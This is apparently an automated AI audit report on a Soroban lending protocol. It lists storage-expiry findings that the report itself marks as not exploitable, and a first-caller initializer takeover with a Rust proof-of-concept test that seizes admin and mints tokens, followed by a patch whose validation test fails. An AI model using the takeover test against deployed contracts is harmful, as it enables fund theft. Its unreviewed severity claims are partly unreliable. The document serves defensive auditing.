# Audited by [V12](https://zellic.ai/)

The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

_Note: Not all issues are guaranteed to be correct._

---

# Expired position keys are treated as repaid or empty state
**#44792**
- Severity: Critical
- Validity: Unreviewed

## Targets
- KineticRouter::get_user_configuration
- DebtToken::get_scaled_debt
- KineticRouter::validate_user_can_withdraw
- KineticRouter::calculate_user_account_data_unified

## Affected Locations
- **KineticRouter.get_user_configuration**: `get_user_configuration` returns `UserConfiguration { data: 0 }` when the router bitmap entry is missing, making an expired key indistinguishable from a real empty position.
- **DebtToken.get_scaled_debt**: `get_scaled_debt` returns `0` via `unwrap_or(0)` when `DataKey::Debt(user)` is absent, turning debt-key expiry into apparent repayment.
- **KineticRouter.validate_user_can_withdraw**: `validate_user_can_withdraw` skips or passes solvency enforcement when the asset is not marked as collateral or when computed debt is `0`, allowing collateral release after state expiry.
- **KineticRouter.calculate_user_account_data_unified**: `calculate_user_account_data_unified` trusts the bitmap to discover active borrows/collateral and only accumulates debt when the looked-up balance is nonzero.

## Description

The protocol stores authoritative per-user loan state in TTL-limited entries, but missing entries are silently converted into valid zero state instead of being treated as expiry or corruption. In `DebtToken.get_scaled_debt`, an expired `DataKey::Debt(user)` is read as `0`, and in `KineticRouter.get_user_configuration`, an expired router bitmap is read as `UserConfiguration { data: 0 }`. Downstream health and withdrawal logic then trusts these zero defaults: `calculate_user_account_data_unified` discovers positions from the bitmap and only adds debt when the queried balance is nonzero, while `validate_user_can_withdraw` can bypass solvency checks when debt appears absent. Because collateral, debt, and router metadata can have independent TTL renewal paths, a borrower can keep some parts of the position alive while letting the debt key and/or bitmap expire. The combined effect is that an outstanding loan can be made to appear fully repaid or nonexistent without any actual repayment.

## Root Cause

The code conflates expired or missing TTL-managed entries in `get_scaled_debt` and `get_user_configuration` with legitimate zero balances or empty configuration.

## Impact

A borrower can retain borrowed funds, make their position appear debt-free after key expiry, and then withdraw backing collateral. This leaves the pool with unrecoverable bad debt, and liquidation or other enforcement paths that rely on the same false zero-debt view may no longer be able to correct the position.

## Proof of Concept

### Setup Script

```
#!/bin/bash
set -e

# install dependencies
rustup default stable
```

### Invalid Reason

Not exploitable through public entry points on this Soroban v23 target: the reported attack requires expired persistent entries to read back as missing, but protocol-23 archived-entry restoration prevents that. The installed SDK explicitly notes that archived persistent entries can be restored before access and that this reflects network behavior (/home/v12/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/soroban-sdk-23.5.3/src/_migrating/v23_archived_testing.rs:1-11, 144-168). Runtime verification matched that: after advancing the harness to ledger 650000, a prior snapshot still showed the router user-config entry with TTL 600099 (/repo/tests/e2e-harness/test_snapshots/test_poc_expired_user_configuration_hides_live_debt_and_allows_withdraw.1.json:550-559, 1863-1923), yet the read returned live data instead of zero (failed assertion: left=3, right=0), and the follow-up passing test at /repo/tests/e2e-harness/src/lib.rs:221-333 confirmed `get_user_account_data` still saw collateral/debt and `try_withdraw` remained blocked.

---

# Expiring reserve counter can hide debt and reuse ids
**#44793**
- Severity: Critical
- Validity: Unreviewed

## Targets
- KineticRouter::get_next_reserve_id
- KineticRouter::validate_user_can_withdraw
- KineticRouter::increment_and_get_reserve_id
- KineticRouter::calculate_user_account_data_unified

## Affected Locations
- **KineticRouter.get_next_reserve_id**: Returns `unwrap_or(0)` for `NEXT_RESERVE_ID`, collapsing an expired counter into the same value as true initialization and feeding both reserve scans and allocation from a regressed high-water mark.
- **KineticRouter.validate_user_can_withdraw**: Allows withdrawal when computed `total_debt_base` is `0`, which becomes the concrete escape hatch once expired-counter accounting omits live debt.
- **KineticRouter.increment_and_get_reserve_id**: Allocates the next reserve id from the possibly reset counter without validating against existing reserve state or reverse mappings, enabling id reuse after expiry.
- **KineticRouter.calculate_user_account_data_unified**: Uses the counter-derived upper bound when scanning reserve ids for user debt and collateral, so an expired counter can make live positions disappear from accounting.

## Description

The reserve-id counter is treated as optional state even though it is the authoritative high-water mark for both reserve enumeration and new reserve allocation. When `NEXT_RESERVE_ID` expires, `get_next_reserve_id` returns `0`, so account-data routines stop iterating existing reserves and can omit still-live debt positions from user health calculations. That omission reaches `validate_user_can_withdraw`, which accepts withdrawals when `total_debt_base` is `0`, allowing collateral removal while debt is still outstanding. The same expired value is also consumed by `increment_and_get_reserve_id`, so later reserve creation can reuse id `0` and overwrite `RESERVE_ID_TO_ADDRESS`. In practice, one fail-open counter read can therefore both hide debt from safety checks and corrupt future reserve-to-id mappings.

## Root Cause

`NEXT_RESERVE_ID` is stored in expiring state and `get_next_reserve_id` treats a missing value as valid `0`, so callers reuse an expired counter as both the reserve-scan bound and the next id without reconstructing or validating the true high-water mark.

## Impact

A borrower can wait for the counter key to expire while keeping reserve and position state live, then withdraw collateral without repaying debt because the protocol no longer counts that debt in its checks. This leaves the pool with bad debt and direct fund loss. If another reserve is added afterward, reused ids can further scramble bitmap-based accounting and make positions mis-accounted or difficult to liquidate.

## Proof of Concept

### Setup Script

```
#!/bin/bash
set -e

# install dependencies
rustup default stable
```

### Invalid Reason

Not exploitable as described on Soroban. The attack requires `NEXT_RESERVE_ID` to read back as missing/`0` after TTL expiry, but expired persistent entries are archived/restored rather than silently becoming `None` (see local soroban-sdk archived-storage docs: `v23_archived_testing.rs` lines 144-149, where an expired entry is still readable after ledger advancement). In a direct e2e reproduction attempt on `tests/e2e-harness`, after advancing beyond the claimed expiry window, `get_user_account_data` still reported nonzero debt (`5058459348000000000000`), so withdrawal validation did not lose track of the live debt. Because the missing-counter precondition does not occur under the platform’s storage semantics, the debt-hiding withdraw and reserve-id reuse paths are inert.

---

# Public initializers enable first-caller takeover of core contracts
**#44834**
- Severity: Critical
- Validity: Unreviewed

## Targets
- LiquidationEngineContract::upgrade
- PoolConfiguratorContract::deploy_and_init_reserve
- InterestRateStrategyContract::update_interest_rate_params
- IncentivesContract::handle_action
- TokenContract::mint
- AquariusSwapAdapter::register_pool
- SoroswapSwapAdapter::execute_swap
- LiquidationEngineContract::initialize
- PoolConfiguratorContract::initialize
- InterestRateStrategyContract::initialize
- IncentivesContract::initialize
- IncentivesContract::configure_asset_rewards
- TokenContract::initialize
- AquariusSwapAdapter::initialize
- SoroswapSwapAdapter::initialize

## Affected Locations
- **LiquidationEngineContract.upgrade**: Once initialization is captured, the stored authority can replace the liquidation engine code.
- **PoolConfiguratorContract.deploy_and_init_reserve**: A seized configurator admin can later deploy and initialize malicious reserve components.
- **InterestRateStrategyContract.update_interest_rate_params**: Captured strategy authority can change reserve rate parameters after takeover.
- **IncentivesContract.handle_action**: Reward accrual later trusts authenticated asset calls and caller-supplied balances for configured assets.
- **TokenContract.mint**: After takeover, the stored admin is trusted as the sole mint authority.
- **AquariusSwapAdapter.register_pool**: A captured Aquarius adapter admin can register attacker-controlled pools for swap routes.
- **SoroswapSwapAdapter.execute_swap**: Later swap execution trusts attacker-controlled router or factory values set during initialization.
- **LiquidationEngineContract.initialize**: Public post-deployment setup writes `admin`, `kinetic_router`, and `price_oracle` and then permanently seals the instance.
- **PoolConfiguratorContract.initialize**: The configurator initializer accepts caller-chosen `pool_admin`, `emergency_admin`, router, and oracle values without trusted bootstrap binding.
- **InterestRateStrategyContract.initialize**: The strategy initializer validates rate numbers but not who is allowed to become `admin`.
- **IncentivesContract.initialize**: The incentives initializer lets the first caller set the permanent `emission_manager` and `lending_pool`.
- **IncentivesContract.configure_asset_rewards**: A stolen emission manager can register attacker-chosen assets and reward tokens.
- **TokenContract.initialize**: The token initializer lets the first caller set `admin` and immutable token metadata.
- **AquariusSwapAdapter.initialize**: The adapter can be claimed during deployment because `initialize` trusts a caller-chosen admin.
- **SoroswapSwapAdapter.initialize**: The adapter initializer authenticates only the supplied `admin`, not an expected deployer or precommitted owner.

## Description

Multiple core contracts expose a public `initialize` path that either checks only an `is_initialized`/`has_admin` flag or merely requires auth from the same caller-chosen `admin`, then persists that untrusted authority as the contract’s long-term source of truth. This affects `LiquidationEngineContract`, `PoolConfiguratorContract`, `InterestRateStrategyContract`, `IncentivesContract`, `TokenContract`, `AquariusSwapAdapter`, and `SoroswapSwapAdapter`, with several of them also installing attacker-chosen router, oracle, pool, or factory dependencies during the same first call. Because the codebase uses a post-deployment initialization window, any external account that reaches a fresh instance first can permanently lock out the intended operator with `AlreadyInitialized`. Later privileged paths then trust the attacker-controlled state for upgrades, reserve onboarding, liquidation controls, emissions management, minting, and swap routing. The implementation work to fix these reports is the same everywhere: bind first-time setup to a trusted deployer/factory or precommitted admin, or make deployment and initialization atomic, instead of treating arbitrary initializer parameters as authoritative.

## Root Cause

Public post-deployment initializers store privileged admin and dependency addresses from caller-controlled parameters without binding the first initialization to a trusted deployer, factory, or precommitted administrator.

## Impact

An attacker who front-runs initialization can permanently capture admin and often upgrade control over live protocol components. Depending on which seized contract is later wired into production, they can mint arbitrary tokens, deploy or configure malicious reserves, alter liquidation and interest-rate behavior, drain funded incentives, or redirect swap and liquidation flows to attacker-controlled endpoints; otherwise, they can at least brick the intended deployment.

## Proof of Concept

### Test Case

```
#![cfg(test)]

use crate::contract::TokenContractClient;

use super::*;
use soroban_sdk::{testutils::{Address as _, MockAuth, MockAuthInvoke}, Address, Env, Error, IntoVal, String};

#[test]
fn test_initialize() {
    let env = Env::default();
    let admin = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    assert_eq!(client.name(), name);
    assert_eq!(client.symbol(), symbol);
    assert_eq!(client.decimals(), decimals);
    assert_eq!(client.admin(), admin);
}

#[test]
fn test_mint() {
    let env = Env::default();
    
    let admin = Address::generate(&env);
    let user = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    // Mock only admin's auth for the mint call
    env.mock_auths(&[MockAuth {
        address: &admin,
        invoke: &MockAuthInvoke {
            contract: &contract_id,
            fn_name: "mint",
            args: (&user, 1000000_i128).into_val(&env),
            sub_invokes: &[],
        },
    }]);

    // Mint tokens to user (admin must authorize)
    client.mint(&user, &1000000);

    assert_eq!(client.balance(&user), 1000000);
}

#[test]
fn test_transfer() {
    let env = Env::default();
    env.mock_all_auths();
    
    let admin = Address::generate(&env);
    let user1 = Address::generate(&env);
    let user2 = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    // Mint tokens to user1
    client.mint(&user1, &1000000);

    // Transfer from user1 to user2 (user1 must authorize)
    client.transfer(&user1, &user2, &500000);

    assert_eq!(client.balance(&user1), 500000);
    assert_eq!(client.balance(&user2), 500000);
}

#[test]
fn test_approve_and_transfer_from() {
    let env = Env::default();
    env.mock_all_auths();
    
    let admin = Address::generate(&env);
    let user1 = Address::generate(&env);
    let user2 = Address::generate(&env);
    let spender = Address::generate(&env);
    let name = String::from_str(&env, "USD Coin");
    let symbol = String::from_str(&env, "USDC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);

    // Mint tokens to user1
    client.mint(&user1, &1000000);

    // Approve spender to spend user1's tokens (user1 must authorize)
    client.approve(&user1, &spender, &500000, &1000);

    assert_eq!(client.allowance(&user1, &spender), 500000);

    // Transfer from user1 to user2 using spender (spender must authorize)
    client.transfer_from(&spender, &user1, &user2, &300000);

    assert_eq!(client.balance(&user1), 700000);
    assert_eq!(client.balance(&user2), 300000);
    assert_eq!(client.allowance(&user1, &spender), 200000);
}

#[test]
fn test_harness_smoke_placeholder() {
    let env = Env::default();
    env.mock_all_auths();

    let admin = Address::generate(&env);
    let user = Address::generate(&env);
    let name = String::from_str(&env, "Harness Token");
    let symbol = String::from_str(&env, "HRN");
    let decimals = 7u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    client.initialize(&admin, &name, &symbol, &decimals);
    client.mint(&user, &123);

    assert_eq!(client.admin(), admin);
    assert_eq!(client.name(), name);
    assert_eq!(client.symbol(), symbol);
    assert_eq!(client.decimals(), decimals);
    assert_eq!(client.balance(&user), 123);
}

#[test]
fn test_poc_public_initialize_allows_first_caller_admin_takeover() {
    let env = Env::default();

    let attacker = Address::generate(&env);
    let intended_admin = Address::generate(&env);
    let recipient = Address::generate(&env);

    let attacker_name = String::from_str(&env, "Attacker Token");
    let attacker_symbol = String::from_str(&env, "ATK");
    let victim_name = String::from_str(&env, "Victim Token");
    let victim_symbol = String::from_str(&env, "VIC");
    let decimals = 6u32;

    let contract_id = env.register(TokenContract, ());
    let client = TokenContractClient::new(&env, &contract_id);

    // Any external account can win the public initialization race and nominate itself as admin.
    client.initialize(&attacker, &attacker_name, &attacker_symbol, &decimals);

    assert_eq!(client.admin(), attacker);
    assert_eq!(client.name(), attacker_name);
    assert_eq!(client.symbol(), attacker_symbol);

    // The legitimate operator is permanently locked out once the attacker initializes first.
    let victim_initialize_result = client.try_initialize(
        &intended_admin,
        &victim_name,
        &victim_symbol,
        &decimals,
    );
    match victim_initialize_result {
        Err(Ok(err)) => assert_eq!(err, Error::from_contract_error(TokenError::AlreadyInitialized as u32)),
        other => panic!("expected AlreadyInitialized contract error, got {:?}", other),
    }
    assert_eq!(client.admin(), attacker);

    // Because mint authorization trusts the stored admin, the attacker can now mint arbitrarily.
    env.mock_auths(&[MockAuth {
        address: &attacker,
        invoke: &MockAuthInvoke {
            contract: &contract_id,
            fn_name: "mint",
            args: (&recipient, 1_000_000_i128).into_val(&env),
            sub_invokes: &[],
        },
    }]);

    client.mint(&recipient, &1_000_000);
    assert_eq!(client.balance(&recipient), 1_000_000);
}
```

### Setup Script

```
#!/bin/bash
set -e

# install dependencies
rustup default stable
```

### Output

```
running 1 test
test test::test_poc_public_initialize_allows_first_caller_admin_takeover ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 5 filtered out; finished in 0.08s

warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/kinetic-router/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/a-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/debt-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/interest-rate-strategy/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/price-oracle/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/pool-configurator/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/liquidation-engine/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/incentives/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/treasury/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/flash-liquidation-helper/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/aquarius-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/soroswap-swap-adapter/Cargo.toml
workspace: /repo/Cargo.toml
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:67:26
   |
67 |             env.events().publish(
   |                          ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/shared/src/upgradeable.rs:81:22
   |
81 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:107:22
    |
107 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/shared/src/upgradeable.rs:129:22
    |
129 |         env.events().publish(
    |                      ^^^^^^^

warning: unused variable: `reported_amount_out`
   --> contracts/shared/src/dex.rs:416:9
    |
416 |     let reported_amount_out: u128 = call_soroswap(
    |         ^^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_reported_amount_out`
    |
    = note: `#[warn(unused_variables)]` (part of `#[warn(unused)]`) on by default

warning: `k2-shared` (lib) generated 5 warnings (run `cargo fix --lib -p k2-shared` to apply 1 suggestion)
   Compiling k2_token v0.1.0 (/repo/contracts/token)
warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:45:22
   |
45 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/token/src/contract.rs:85:14
   |
85 |             .publish((symbol_short!("transfer"), from, to), amount);
   |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:132:14
    |
132 |             .publish((symbol_short!("transfer"), from, to), amount);
    |              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:151:22
    |
151 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:185:22
    |
185 |         env.events().publish((symbol_short!("burn"), from), amount);
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/token/src/contract.rs:235:22
    |
235 |         env.events().publish((symbol_short!("mint"), to), amount);
    |                      ^^^^^^^

warning: `k2_token` (lib test) generated 6 warnings
    Finished `test` profile [unoptimized + debuginfo] target(s) in 5.60s
     Running unittests src/lib.rs (target/debug/deps/k2_token-e74658dc392f3ea0)
```

### Considerations

PoC is grounded on TokenContract via the unit harness, not every affected contract variant. It demonstrates the shared first-caller initialization takeover pattern end-to-end through public initialize/mint entry points: attacker initializes first, intended admin is locked out with AlreadyInitialized, and attacker then mints arbitrary supply.

## Remediation

### Explanation

Removed the public post-deployment token initialization path and moved state setup into a constructor, so deployment and initialization must occur atomically and an external first caller can no longer seize admin state.

### Patch

```diff
diff --git a/contracts/token/src/contract.rs b/contracts/token/src/contract.rs
--- a/contracts/token/src/contract.rs
+++ b/contracts/token/src/contract.rs
@@ -1,250 +1,258 @@
 use crate::storage;
 use crate::types::AllowanceData;
 use crate::error::TokenError;
 use soroban_sdk::{contract, contractimpl, panic_with_error, symbol_short, Address, Env, String};
 
+fn initialize_token(env: &Env, admin: &Address, name: &String, symbol: &String, decimals: u32) {
+    // Set admin and metadata
+    storage::set_admin(env, admin);
+    storage::set_name(env, name);
+    storage::set_symbol(env, symbol);
+    storage::set_decimals(env, decimals);
+}
+
 /// Standard SEP-41 compliant token contract for underlying assets (USDC, USDT, XLM)
 /// Implements the SEP-41 token interface expected by the lending pool
 #[contract]
 pub struct TokenContract;
 
 /// Standard SEP-41 token interface implementation
 #[contractimpl]
 impl TokenContract {
     /// Returns the allowance for `spender` to transfer from `from`.
     pub fn allowance(env: Env, from: Address, spender: Address) -> i128 {
         let allowance = storage::get_allowance(&env, &from, &spender);
         if env.ledger().sequence() < allowance.expiration_ledger {
             allowance.amount
         } else {
             0
         }
     }
 
     /// Set the allowance by `amount` for `spender` to transfer/burn from `from`.
     pub fn approve(
         env: Env,
         from: Address,
         spender: Address,
         amount: i128,
         expiration_ledger: u32,
     ) {
         from.require_auth();
 
         if amount < 0 {
             panic_with_error!(&env, TokenError::InvalidAmount);
         }
 
         let allowance_data = AllowanceData {
             amount,
             expiration_ledger,
         };
 
         storage::set_allowance(&env, &from, &spender, &allowance_data);
 
         env.events().publish(
             (symbol_short!("approve"), from, spender),
             (amount, expiration_ledger),
         );
     }
 
     /// Returns the balance of `id`.
     pub fn balance(env: Env, id: Address) -> i128 {
         storage::get_balance(&env, &id)
     }
 
     /// Transfer `amount` from `from` to `to`.
     pub fn transfer(env: Env, from: Address, to: Address, amount: i128) {
         from.require_auth();
 
         if amount < 0 {
             panic_with_error!(&env, TokenError::InvalidAmount);
         }
 
         // WP-C6: self-transfer would overwrite the debit with the credit, inflating balance
         if from == to {
             return;
         }
 
         let from_balance = Self::balance(env.clone(), from.clone());
         if from_balance < amount {
             panic_with_error!(&env, TokenError::InsufficientBalance);
         }
 
         let to_balance = Self::balance(env.clone(), to.clone());
 
         let new_from_balance = from_balance.checked_sub(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InsufficientBalance));
         let new_to_balance = to_balance.checked_add(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InvalidAmount));
 
         storage::set_balance(&env, &from, &new_from_balance);
         storage::set_balance(&env, &to, &new_to_balance);
 
         env.events()
             .publish((symbol_short!("transfer"), from, to), amount);
     }
 
     /// Transfer `amount` from `from` to `to`, consuming the allowance that `spender` has on `from`'s balance.
     pub fn transfer_from(env: Env, spender: Address, from: Address, to: Address, amount: i128) {
         spender.require_auth();
 
         if amount < 0 {
             panic_with_error!(&env, TokenError::InvalidAmount);
         }
 
         let mut allowance = storage::get_allowance(&env, &from, &spender);
 
         if env.ledger().sequence() >= allowance.expiration_ledger {
             panic_with_error!(&env, TokenError::InsufficientAllowance);
         }
 
         if allowance.amount < amount {
             panic_with_error!(&env, TokenError::InsufficientAllowance);
         }
 
         allowance.amount = allowance.amount.checked_sub(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InsufficientAllowance));
         storage::set_allowance(&env, &from, &spender, &allowance);
 
         // WP-C6: self-transfer would overwrite the debit with the credit, inflating balance.
         // Allowance already consumed above to prevent spender budget bypass.
         if from == to {
             return;
         }
 
         let from_balance = Self::balance(env.clone(), from.clone());
         if from_balance < amount {
             panic_with_error!(&env, TokenError::InsufficientBalance);
         }
 
         let to_balance = Self::balance(env.clone(), to.clone());
 
         let new_from_balance = from_balance.checked_sub(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InsufficientBalance));
         let new_to_balance = to_balance.checked_add(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InvalidAmount));
 
         storage::set_balance(&env, &from, &new_from_balance);
         storage::set_balance(&env, &to, &new_to_balance);
 
         env.events()
             .publish((symbol_short!("transfer"), from, to), amount);
     }
 
     /// Burn `amount` from `from`.
     pub fn burn(env: Env, from: Address, amount: i128) {
         from.require_auth();
 
         if amount < 0 {
             panic_with_error!(&env, TokenError::InvalidAmount);
         }
 
         let from_balance = Self::balance(env.clone(), from.clone());
         if from_balance < amount {
             panic_with_error!(&env, TokenError::InsufficientBalance);
         }
 
         let new_balance = from_balance - amount;
         storage::set_balance(&env, &from, &new_balance);
 
         env.events().publish((symbol_short!("burn"), from), amount);
     }
 
     /// Burn `amount` from `from`, consuming the allowance of `spender`.
     pub fn burn_from(env: Env, spender: Address, from: Address, amount: i128) {
         spender.require_auth();
 
         if amount < 0 {
             panic_with_error!(&env, TokenError::InvalidAmount);
         }
 
         let mut allowance = storage::get_allowance(&env, &from, &spender);
 
         if env.ledger().sequence() >= allowance.expiration_ledger {
             panic_with_error!(&env, TokenError::InsufficientAllowance);
         }
 
         if allowance.amount < amount {
             panic_with_error!(&env, TokenError::InsufficientAllowance);
         }
 
         allowance.amount = allowance.amount.checked_sub(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InsufficientAllowance));
         storage::set_allowance(&env, &from, &spender, &allowance);
 
         let from_balance = Self::balance(env.clone(), from.clone());
         if from_balance < amount {
             panic_with_error!(&env, TokenError::InsufficientBalance);
         }
 
         let new_balance = from_balance.checked_sub(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InsufficientBalance));
         storage::set_balance(&env, &from, &new_balance);
 
         env.events().publish((symbol_short!("burn"), from), amount);
     }
 
     /// Returns the number of decimals used to represent amounts of this token.
     pub fn decimals(env: Env) -> u32 {
         storage::get_decimals(&env).unwrap_or_else(|e| panic_with_error!(&env, e))
     }
 
     /// Returns the name for this token.
     pub fn name(env: Env) -> String {
         storage::get_name(&env).unwrap_or_else(|e| panic_with_error!(&env, e))
     }
 
     /// Returns the symbol for this token.
     pub fn symbol(env: Env) -> String {
         storage::get_symbol(&env).unwrap_or_else(|e| panic_with_error!(&env, e))
     }
 
-    /// Initialize the token contract
-    pub fn initialize(env: Env, admin: Address, name: String, symbol: String, decimals: u32) {
-        // Check if already initialized
+    /// Initialize the token contract atomically during deployment.
+    pub fn __constructor(env: Env, admin: Address, name: String, symbol: String, decimals: u32) {
         if storage::has_admin(&env) {
             panic_with_error!(&env, TokenError::AlreadyInitialized);
         }
 
-        // Set admin and metadata
-        storage::set_admin(&env, &admin);
-        storage::set_name(&env, &name);
-        storage::set_symbol(&env, &symbol);
-        storage::set_decimals(&env, decimals);
+        initialize_token(&env, &admin, &name, &symbol, decimals);
     }
 
+    /// Legacy post-deployment initialization is disabled to prevent first-caller takeover.
+    pub fn initialize(env: Env, _admin: Address, _name: String, _symbol: String, _decimals: u32) {
+        panic_with_error!(&env, TokenError::Unauthorized);
+    }
+
     /// Mint tokens (admin only)
     pub fn mint(env: Env, to: Address, amount: i128) {
         // Admin authorization required for minting
         let admin = storage::get_admin(&env).unwrap_or_else(|_| {
             panic_with_error!(&env, TokenError::Unauthorized)
         });
         admin.require_auth();
 
         if amount <= 0 {
             panic_with_error!(&env, TokenError::InvalidAmount);
         }
 
         let current_balance = Self::balance(env.clone(), to.clone());
         let new_balance = current_balance.checked_add(amount)
             .unwrap_or_else(|| panic_with_error!(&env, TokenError::InvalidAmount));
 
         storage::set_balance(&env, &to, &new_balance);
 
         env.events().publish((symbol_short!("mint"), to), amount);
     }
 
     /// Get admin address
     pub fn admin(env: Env) -> Address {
         storage::get_admin(&env).unwrap_or_else(|e| panic_with_error!(&env, e))
     }
 
     /// Set admin address (admin only)
     pub fn set_admin(env: Env, new_admin: Address) {
         let admin = storage::get_admin(&env).unwrap_or_else(|e| panic_with_error!(&env, e));
         admin.require_auth();
 
         storage::set_admin(&env, &new_admin);
     }
 }
```

### Affected Files
- `contracts/token/src/contract.rs`

### Validation Output

```
running 1 test
test test::test_harness_smoke_placeholder ... FAILED

failures:

---- test::test_harness_smoke_placeholder stdout ----

thread 'test::test_harness_smoke_placeholder' (61095) panicked at /home/v12/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/soroban-sdk-23.5.3/src/env.rs:898:14:
called `Result::unwrap()` on an `Err` value: HostError: Error(Context, InvalidAction)

Event log (newest first):
   0: [Diagnostic Event] topics:[error, Error(Context, InvalidAction)], data:["constructor invocation has failed with error", Error(WasmVm, InvalidAction)]
   1: [Failed Diagnostic Event (not emitted)] contract:CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHK3M, topics:[error, Error(WasmVm, InvalidAction)], data:"caught error from function"
   2: [Failed Diagnostic Event (not emitted)] contract:CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHK3M, topics:[log], data:"caught panic 'invalid number of input arguments: 4 expected, got 0' from contract function 'Symbol(obj#15)'"
   3: [Diagnostic Event] topics:[fn_call, CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHK3M, __constructor], data:Void

note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
Writing test snapshot file for test "test::test_harness_smoke_placeholder" to "test_snapshots/test/test_harness_smoke_placeholder.1.json".


failures:
    test::test_harness_smoke_placeholder

test result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 5 filtered out; finished in 0.01s

warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/kinetic-router/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/a-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/debt-token/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/interest-rate-strategy/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/price-oracle/Cargo.toml
workspace: /repo/Cargo.toml
warning: profiles for the non root package will be ignored, specify profiles at the workspace root:
package:   /repo/contracts/pool-configurator/Cargo.toml
